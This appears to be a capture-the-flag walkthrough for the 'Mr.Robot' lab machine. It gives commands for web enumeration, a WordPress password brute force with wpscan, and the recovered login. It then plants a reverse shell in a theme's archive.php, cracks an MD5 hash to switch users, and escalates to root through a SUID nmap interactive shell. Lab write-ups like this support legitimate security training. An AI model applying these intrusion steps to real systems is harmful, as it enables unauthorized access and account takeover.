## Mr.Robot

#### Http Enum
```
$ ffuf -w {WORDLIST} -u http://{EXPORT_IP}/FUZZ

> /robots
>> fsocity.dic
>> key-1-of-3.txt
```
- Get First Flag in : "/key-1-of-3.txt"
- Next : just save "fsocity.dic" File
  - cat fsocity | sort -r | uniq >> filter.dic

#### WordPress Login
```
$ wpscan --url http://{IP} --passwords filter.dic --username {USERNAME_DICT}
```
- elliot:ER28-0652

#### Gaining Access
```
1. themes/twentyfifteen/arcivce.php << edit revshell.php

2. http://{IP}/wp-content/themes/twentyfifteen/archive.php
```

#### USER Escalate
```
$ cd ~/home/robot

$ cat password.raw-md5

crackstation :  c3fcd3d76192e4007dfb496cca67e13b 

$ su robot
passwords : abcdefghijklmnopqrstuvwxyz

$ cat key-2-of-3.txt
```

#### Root Escalte
```
$ find / -perm -4000 2>/dev/null

$ /usr/local/bin/nmap --interactive

$ !sh

# cat /root/key-3-of-3.txt
```